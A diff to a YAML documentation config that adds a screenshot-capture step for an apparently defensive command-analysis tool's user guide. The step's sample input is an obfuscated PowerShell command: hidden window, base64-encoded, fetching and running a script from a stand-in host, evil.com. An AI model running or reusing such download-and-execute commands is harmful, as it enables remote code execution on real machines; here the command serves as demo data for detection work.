@@ -11,3 +11,19 @@ tips:
   - Every decode, correction, promote, benchmark, enrichment, and TAXII push auto-lands here
   - Add free-form notes with the composer at the bottom
 related: [correction_flow, candidate_explorer]
+
+# ------------------------------------------------------------
+# Screenshot capture — Phase 1 User Guide
+# ------------------------------------------------------------
+capture:
+  login: true
+  steps:
+    - url: /workspace
+      wait_for: '[data-testid="input-textarea"]'
+      type_into:
+        selector: '[data-testid="input-textarea"]'
+        text: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAGEALgBwAHMAMQAnACkA
+      click_before: '[data-testid="btn-auto-investigate-inline"]'
+      delay_ms: 4000
+      post_click_ms: 6000
+      full_page: true
